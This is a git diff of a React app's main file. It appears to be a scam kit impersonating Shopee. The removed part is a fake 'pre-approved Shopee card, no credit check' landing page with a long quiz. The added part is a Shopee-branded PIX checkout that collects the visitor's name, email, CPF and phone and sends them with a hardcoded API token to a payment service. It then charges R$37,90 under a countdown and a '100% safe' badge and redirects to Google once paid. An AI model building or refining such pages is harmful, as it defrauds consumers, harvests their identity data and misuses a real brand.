@@ -1,354 +1,268 @@
-import React, { useState, useEffect } from 'react';
-import { CreditCard, ShieldCheck, Lock, Gift } from 'lucide-react';
-import SecondPage from './SecondPage';
-import ThirdPage from './ThirdPage';
-import FourthPage from './FourthPage';
-import FifthPage from './FifthPage';
-import SixthPage from './SixthPage';
-import SeventhPage from './SeventhPage';
-import EighthPage from './EighthPage';
-import NinthPage from './NinthPage';
-import TenthPage from './TenthPage';
-import EleventhPage from './EleventhPage';
-import TwelfthPage from './TwelfthPage';
-import ThirteenthPage from './ThirteenthPage';
-import FourteenthPage from './FourteenthPage';
-import FifteenthPage from './FifteenthPage';
-import SixteenthPage from './SixteenthPage';
-import SeventeenthPage from './SeventeenthPage';
-import EighteenthPage from './EighteenthPage';
-import NineteenthPage from './NineteenthPage';
-import TwentiethPage from './TwentiethPage';
+import React, { useEffect, useState } from 'react';
+    import { Shield, Copy, Clock, Loader2 } from 'lucide-react';
 
-function App() {
-  const [showSecondPage, setShowSecondPage] = useState(false);
-  const [showThirdPage, setShowThirdPage] = useState(false);
-  const [showFourthPage, setShowFourthPage] = useState(false);
-  const [showFifthPage, setShowFifthPage] = useState(false);
-  const [showSixthPage, setShowSixthPage] = useState(false);
-  const [showSeventhPage, setShowSeventhPage] = useState(false);
-  const [showEighthPage, setShowEighthPage] = useState(false);
-  const [showNinthPage, setShowNinthPage] = useState(false);
-  const [showTenthPage, setShowTenthPage] = useState(false);
-  const [showEleventhPage, setShowEleventhPage] = useState(false);
-  const [showTwelfthPage, setShowTwelfthPage] = useState(false);
-  const [showThirteenthPage, setShowThirteenthPage] = useState(false);
-  const [showFourteenthPage, setShowFourteenthPage] = useState(false);
-  const [showFifteenthPage, setShowFifteenthPage] = useState(false);
-  const [showSixteenthPage, setShowSixteenthPage] = useState(false);
-  const [showSeventeenthPage, setShowSeventeenthPage] = useState(false);
-  const [showEighteenthPage, setShowEighteenthPage] = useState(false);
-  const [showNineteenthPage, setShowNineteenthPage] = useState(false);
-  const [showTwentiethPage, setShowTwentiethPage] = useState(false);
+    interface PaymentResponse {
+      qr_code?: string;
+      qr_code_text?: string;
+      status?: string;
+      error?: string;
+    }
+
+    interface TransactionResponse {
+      pix: {
+        pix_qr_code: string;
+      };
+      status: string;
+    }
 
 
-  const handleNextFromSecondPage = () => {
-    setShowSecondPage(false);
-    setShowThirdPage(true);
-  };
+    function App() {
+      const [paymentData, setPaymentData] = useState<PaymentResponse>({});
+      const [timeLeft, setTimeLeft] = useState<string>('15:00');
+      const [progress, setProgress] = useState(0);
+      const [copied, setCopied] = useState(false);
+      const [transactionData, setTransactionData] = useState<TransactionResponse | null>(null);
+      const [pixCode, setPixCode] = useState<string | null>(null);
+      const [qrCodeUrl, setQrCodeUrl] = useState<string | null>(null);
+      const [loading, setLoading] = useState(true);
+      const [timerStarted, setTimerStarted] = useState(false);
+      const [copyButtonColor, setCopyButtonColor] = useState("#ee4d2d");
+      const [paymentStatus, setPaymentStatus] = useState<string | null>(null);
 
-  const handleNextFromThirdPage = () => {
-    setShowThirdPage(false);
-    setShowFourthPage(true);
-  };
+      useEffect(() => {
+        const generatePayment = async () => {
+          const customerName = localStorage.getItem('CHECKOUT_NAME') || 'dasdasd asdasd';
+          const customerEmail = localStorage.getItem('CHECKOUT_EMAIL') || 'dasdasd@dasdas.com';
+          const customerCPF = localStorage.getItem('CHECKOUT_CPF') || '42158486104';
+          const customerPhone = localStorage.getItem('CHECKOUT_PHONE') || '11984456215';
+          const utmParamsString = localStorage.getItem('utmParams');
+          const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};
 
-  const handleNextFromFourthPage = () => {
-    setShowFourthPage(false);
-    setShowFifthPage(true);
-  };
+          try {
+            const response = await fetch('https://api.disruptybr.com.br/api/public/v1/transactions?api_token=5w1pSQKdNzhN3u4fUiFxDdZeEh956kXWtIhL03yV2gwXLhz5YXbVxIy5sUH3', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+              },
+              body: JSON.stringify({
+                amount: 3790,
+                offer_hash: "1znznrphl4",
+                payment_method: "pix",
+                customer: {
+                  name: customerName,
+                  email: customerEmail,
+                  document: customerCPF,
+                  phone_number: customerPhone
+                },
+                cart: [{
+                  product_hash: "upav9bjeds",
+                  title: "shpcrd",
+                  price: 3790,
+                  quantity: 1,
+                  operation_type: 1,
+                  tangible: false
+                }],
+                installments: 1,
+                expire_in_days: 1,
+                tracking: {
+                  src: "api",
+                  utm_source: utmParams.utm_source || "",
+                  utm_medium: utmParams.utm_medium || "",
+                  utm_campaign: utmParams.utm_campaign || "",
+                  utm_term: utmParams.utm_term || "",
+                  utm_content: utmParams.utm_content || "",
+                  utm_id: utmParams.utm_id || ""
+                }
+              })
+            });
 
-  const handleNextFromFifthPage = () => {
-    setShowFifthPage(false);
-    setShowSixthPage(true);
-  };
+            const data = await response.json();
+            console.log('Payment data:', data);
+            setTransactionData(data);
+            setPixCode(data?.pix?.pix_qr_code || null);
+            if (data?.pix?.pix_qr_code) {
+              const qrCodeImage = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix.pix_qr_code)}`;
+              setQrCodeUrl(qrCodeImage);
+              setTimerStarted(true);
+            }
+            setLoading(false);
+            setPaymentStatus(data?.status || null);
 
-  const handleNextFromSixthPage = () => {
-    setShowSixthPage(false);
-    setShowSeventhPage(true);
-  };
+          } catch (error) {
+            console.error('Error generating payment:', error);
+            setPaymentData({ error: 'Erro ao gerar pagamento' });
+            setLoading(false);
+          }
+        };
 
-  const handleNextFromSeventhPage = () => {
-    setShowSeventhPage(false);
-    setShowEighthPage(true);
-  };
+        generatePayment();
+      }, []);
 
-  const handleNextFromEighthPage = () => {
-    setShowEighthPage(false);
-    setShowNinthPage(true);
-  };
+      useEffect(() => {
+        if (!timerStarted) return;
 
-  const handleNextFromNinthPage = () => {
-    setShowNinthPage(false);
-    setShowTenthPage(true);
-  };
+        const startTime = Date.now();
+        const duration = 15 * 60 * 1000; // 15 minutes in milliseconds
 
-  const handleNextFromTenthPage = () => {
-    setShowTenthPage(false);
-    setShowEleventhPage(true);
-  };
+        const timer = setInterval(() => {
+          const elapsedTime = Date.now() - startTime;
+          const remainingTime = duration - elapsedTime;
 
-  const handleNextFromEleventhPage = () => {
-    setShowEleventhPage(false);
-    setShowTwelfthPage(true);
-  };
+          if (remainingTime <= 0) {
+            clearInterval(timer);
+            setTimeLeft('00:00');
+            setProgress(100);
+            return;
+          }
 
-  const handleNextFromTwelfthPage = () => {
-    setShowTwelfthPage(false);
-    setShowThirteenthPage(true);
-  };
+          const minutes = Math.floor(remainingTime / 60000);
+          const seconds = Math.floor((remainingTime % 60000) / 1000);
+          setTimeLeft(`${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`);
 
-  const handleNextFromThirteenthPage = () => {
-    setShowThirteenthPage(false);
-    setShowFourteenthPage(true);
-  };
+          const progressValue = ((elapsedTime / duration) * 100);
+          setProgress(progressValue);
+        }, 1000);
 
-  const handleNextFromFourteenthPage = () => {
-    setShowFourteenthPage(false);
-    setShowFifteenthPage(true);
-  };
+        return () => clearInterval(timer);
+      }, [timerStarted]);
 
-  const handleNextFromFifteenthPage = () => {
-    setShowFifteenthPage(false);
-    setShowSixteenthPage(true);
-  };
+      useEffect(() => {
+        if (transactionData?.status === 'paid') {
+          window.location.href = 'https://www.google.com.br';
+        }
+      }, [transactionData?.status]);
 
-  const handleNextFromSixteenthPage = () => {
-    setShowSixteenthPage(false);
-    setShowSeventeenthPage(true);
-  };
+      const handleCopy = async () => {
+        if (pixCode) {
+          try {
+            await navigator.clipboard.writeText(pixCode);
+            setCopied(true);
+            setCopyButtonColor("#48bb78");
+            setTimeout(() => {
+              setCopied(false);
+              setCopyButtonColor("#ee4d2d");
+            }, 2000);
+          } catch (err) {
+            console.error("Failed to copy text: ", err);
+            setCopied(false);
+            setCopyButtonColor("#ee4d2d");
+          }
+        }
+      };
 
-  const handleNextFromSeventeenthPage = () => {
-    setShowSeventeenthPage(false);
-    setShowEighteenthPage(true);
-  };
+      const handleCodeClick = async () => {
+        if (pixCode) {
+          await handleCopy();
+        }
+      };
 
-  const handleNextFromEighteenthPage = () => {
-    setShowEighteenthPage(false);
-    setShowNineteenthPage(true);
-  };
+      return (
+        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
+          <div className="bg-white rounded-2xl shadow-lg max-w-md w-full p-6 space-y-6">
+            <div className="flex justify-center">
+              <img src="https://cdn.worldvectorlogo.com/logos/shopee-logo.svg" alt="Shopee Logo" className="h-12 mb-4" />
+            </div>
+            <div className="text-center space-y-2">
+              <h1 className="text-2xl font-bold text-gray-900">Finalize o Pagamento!</h1>
+            </div>
 
-  const handleNextFromNineteenthPage = () => {
-    setShowNineteenthPage(false);
-    setShowTwentiethPage(true);
-  };
+            {timerStarted && (
+              <div className="text-center">
+                <span className="text-2xl font-bold">{timeLeft}</span>
+                <span className="text-gray-600"> para pagar</span>
+              </div>
+            )}
 
-  const handleBackFromThirdPage = () => {
-    setShowThirdPage(false);
-    setShowSecondPage(true);
-  };
+            {timerStarted && (
+              <div className="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
+                <div
+                  className="bg-[#ee4d2d] h-full transition-all duration-1000 ease-linear"
+                  style={{ width: `${progress}%` }}
+                ></div>
+              </div>
+            )}
 
-  const handleBackFromFourthPage = () => {
-    setShowFourthPage(false);
-    setShowThirdPage(true);
-  };
+            <div className="bg-gray-50 p-4 rounded-lg space-y-4">
+              {loading ? (
+                <div className="flex items-center justify-center">
+                  <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-[#ee4d2d]"></div>
+                </div>
+              ) : (
+                <>
+                  {qrCodeUrl && (
+                    <div className="flex flex-col items-center space-y-4">
+                      <img src={qrCodeUrl} alt="QR Code" className="w-48 h-48" />
+                      <div
+                        onClick={handleCodeClick}
+                        className="w-full bg-gray-100 p-3 rounded-lg break-all text-sm text-gray-600 cursor-pointer hover:bg-gray-200 transition-colors"
+                      >
+                        {pixCode}
+                      </div>
+                      <button
+                        onClick={handleCopy}
+                        className={`w-full text-white py-3 rounded-lg flex items-center justify-center space-x-2 hover:bg-[#a1341e] transition-colors`}
+                        style={{ backgroundColor: copyButtonColor }}
+                      >
+                        <Copy size={20} />
+                        <span>{copied ? 'Copiado!' : 'Copiar código PIX'}</span>
+                      </button>
+                      {paymentStatus !== 'paid' && (
+                        <div className="flex items-center justify-center text-[#ee4d2d] space-x-2">
+                          <Loader2 size={16} className="animate-spin" color="#ee4d2d" />
+                          <span>Aguardando Pagamento</span>
+                        </div>
+                      )}
+                    </div>
+                  )}
+                </>
+              )}
+              <div className="flex justify-between items-center">
+                <span className="text-gray-600">Valor:</span>
+                <span className="text-emerald-600 text-xl font-bold">R$ 37,90</span>
+              </div>
+            </div>
 
-  const handleBackFromFifthPage = () => {
-    setShowFifthPage(false);
-    setShowFourthPage(true);
-  };
+            <div className="space-y-4">
+              <div className="flex items-start space-x-3">
+                <div className="flex-shrink-0 w-8 h-8 bg-[#ee4d2d] rounded-full flex items-center justify-center text-white font-medium">
+                  1
+                </div>
+                <div className="flex-1">
+                  <p className="text-gray-700">Copie o código PIX abaixo.</p>
+                </div>
+              </div>
 
-  useEffect(() => {
-    window.scrollTo(0, 0); // Scroll to top on every render
-  });
+              <div className="flex items-start space-x-3">
+                <div className="flex-shrink-0 w-8 h-8 bg-[#ee4d2d] rounded-full flex items-center justify-center text-white font-medium">
+                  2
+                </div>
+                <div className="flex-1">
+                  <p className="text-gray-700">Abra o app do seu banco e escolha a opção PIX, como se fosse fazer uma transferência.</p>
+                </div>
+              </div>
 
-  if (showTwentiethPage) {
-    return <TwentiethPage />;
-  }
+              <div className="flex items-start space-x-3">
+                <div className="flex-shrink-0 w-8 h-8 bg-[#ee4d2d] rounded-full flex items-center justify-center text-white font-medium">
+                  3
+                </div>
+                <div className="flex-1">
+                  <p className="text-gray-700">Selecione a opção PIX cópia e cola, cole a chave copiada e confirme o pagamento.</p>
+                </div>
+              </div>
+            </div>
 
-  if (showNineteenthPage) {
-    return <NineteenthPage onNext={handleNextFromNineteenthPage} />;
-  }
+            <div className="bg-amber-50 border border-amber-200 p-4 rounded-lg text-amber-800">
+              <p>Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado sua solicitação será cancelada.</p>
+            </div>
 
-  if (showEighteenthPage) {
-    return <EighteenthPage onNext={handleNextFromEighteenthPage} />;
-  }
-
-  if (showSeventeenthPage) {
-    return <SeventeenthPage onNext={handleNextFromSeventeenthPage} />;
-  }
-
-  if (showSixteenthPage) {
-    return <SixteenthPage onNext={handleNextFromSixteenthPage} />;
-  }
-
-  if (showFifteenthPage) {
-    return <FifteenthPage onNext={handleNextFromFifteenthPage} onBack={handleBackFromFifthPage} />;
-  }
-
-  if (showFourteenthPage) {
-    return <FourteenthPage onNext={handleNextFromFourteenthPage} onBack={handleBackFromFourthPage} />;
-  }
-
-  if (showThirteenthPage) {
-    return <ThirteenthPage onNext={handleNextFromThirteenthPage} onBack={handleBackFromThirdPage} />;
-  }
-
-  if (showTwelfthPage) {
-    return <TwelfthPage onNext={handleNextFromTwelfthPage} />;
-  }
-
-  if (showEleventhPage) {
-    return <EleventhPage onNext={handleNextFromEleventhPage} />;
-  }
-
-  if (showTenthPage) {
-    return <TenthPage onNext={handleNextFromTenthPage} />;
-  }
-
-  if (showNinthPage) {
-    return <NinthPage onNext={handleNextFromNinthPage} />;
-  }
-
-  if (showEighthPage) {
-    return <EighthPage onNext={handleNextFromEighthPage} />;
-  }
-
-  if (showSeventhPage) {
-    return <SeventhPage onNext={handleNextFromSeventhPage} />;
-  }
-
-  if (showSixthPage) {
-    return <SixthPage onNext={handleNextFromSixthPage} />;
-  }
-
-  if (showFifthPage) {
-    return <FifthPage onNext={handleNextFromFifthPage} onBack={handleBackFromFifthPage} />;
-  }
-
-  if (showFourthPage) {
-    return <FourthPage onNext={handleNextFromFourthPage} onBack={handleBackFromFourthPage} />;
-  }
-
-  if (showThirdPage) {
-    return <ThirdPage onNext={handleNextFromThirdPage} onBack={handleBackFromThirdPage} />;
-  }
-
-  if (showSecondPage) {
-    return <SecondPage onNext={handleNextFromSecondPage} />;
-  }
-
-  return (
-    <div className="min-h-screen bg-[#ff4d2d] text-white flex flex-col">
-      {/* Header */}
-      <header className="p-4 flex justify-center">
-        <img 
-          src="https://freelogopng.com/images/all_img/1656181621shopee-logo-white.png" 
-          alt="Shopee Logo" 
-          className="h-8 mb-12"
-        />
-      </header>
-
-      {/* Main Content */}
-      <main className="max-w-md mx-auto px-4 pb-8 flex-1">
-        <div className="text-center mb-6">
-          <p className="bg-[#ff6b4f] inline-block px-4 py-1 rounded-full text-sm mb-4">
-            Sem consulta ao SPC/Serasa
-          </p>
-          <h2 className="text-2xl font-bold mb-2">
-            Cartão Shopee com limite pré-aprovado de até R$ 5.000
-          </h2>
-          <p className="text-sm mb-4">
-            Processo 100% digital, sem burocracia e sem precisar sair de casa
-          </p>
+            <div className="flex items-center justify-center text-emerald-600 space-x-2">
+              <Shield size={20} fill="#48bb78" color="#48bb78" />
+              <span>Site 100% Seguro</span>
+            </div>
+          </div>
         </div>
+      );
+    }
 
-        {/* Security Features */}
-        <div className="flex justify-between mb-6">
-          <div className="flex items-center gap-2">
-            <Lock className="w-5 h-5" />
-            <span className="text-sm">Site Seguro</span>
-          </div>
-          <div className="flex items-center gap-2">
-            <ShieldCheck className="w-5 h-5" />
-            <span className="text-sm">Dados Protegidos</span>
-          </div>
-        </div>
-
-        {/* CTA Button */}
-        <button onClick={() => setShowSecondPage(true)} className="w-full bg-white text-[#ff4d2d] py-3 rounded-lg font-bold mb-8">
-          QUERO SOLICITAR MEU CARTÃO
-        </button>
-
-        {/* How it Works */}
-        <section className="bg-white text-gray-800 rounded-lg p-6 mb-8">
-          <h3 className="text-xl font-bold mb-6">Como funciona?</h3>
-          
-          <div className="space-y-6">
-            <div className="flex gap-4">
-              <div className="bg-[#ff4d2d] text-white w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0">
-                1
-              </div>
-              <div>
-                <h4 className="font-bold mb-1">Responda o Quiz</h4>
-                <p className="text-sm text-gray-600">
-                  Apenas 4 perguntas rápidas para analisarmos seu perfil
-                </p>
-              </div>
-            </div>
-
-            <div className="flex gap-4">
-              <div className="bg-[#ff4d2d] text-white w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0">
-                2
-              </div>
-              <div>
-                <h4 className="font-bold mb-1">Análise Instantânea</h4>
-                <p className="text-sm text-gray-600">
-                  Resultado em segundos, sem consulta ao SPC/Serasa
-                </p>
-              </div>
-            </div>
-
-            <div className="flex gap-4">
-              <div className="bg-[#ff4d2d] text-white w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0">
-                3
-              </div>
-              <div>
-                <h4 className="font-bold mb-1">Receba seu Cartão</h4>
-                <p className="text-sm text-gray-600">
-                  Cartão virtual na hora e físico em até 7 dias úteis
-                </p>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        {/* Benefits */}
-        <section className="space-y-4">
-          <div className="bg-white text-gray-800 p-4 rounded-lg flex items-center gap-4">
-            <CreditCard className="w-6 h-6 text-[#ff4d2d]" />
-            <div>
-              <h4 className="font-bold">Zero Anuidade</h4>
-              <p className="text-sm text-gray-600">Economize mais de R$ 500 por ano em anuidades</p>
-            </div>
-          </div>
-
-          <div className="bg-white text-gray-800 p-4 rounded-lg flex items-center gap-4">
-            <CreditCard className="w-6 h-6 text-[#ff4d2d]" />
-            <div>
-              <h4 className="font-bold">Limite Flexível</h4>
-              <p className="text-sm text-gray-600">Aumente seu limite conforme usa o cartão</p>
-            </div>
-          </div>
-
-          <div className="bg-white text-gray-800 p-4 rounded-lg flex items-center gap-4">
-            <Gift className="w-6 h-6 text-[#ff4d2d]" />
-            <div>
-              <h4 className="font-bold">Cashback Garantido</h4>
-              <p className="text-sm text-gray-600">Receba até 5% de volta em todas as suas compras</p>
-            </div>
-          </div>
-        </section>
-      </main>
-
-      {/* Footer */}
-      <footer className="bg-gray-900 text-white text-xs p-4 mt-8">
-        <div className="max-w-md mx-auto">
-          <p className="mb-2">© 2022 Shopee Brasil. CNPJ: 35.635.824/0001-12</p>
-          <p>Av. das Nações Unidas, 3003 - Bonfim, Osasco - SP, 06233-903</p>
-        </div>
-      </footer>
-    </div>
-  );
-}
-
-export default App;
+    export default App;
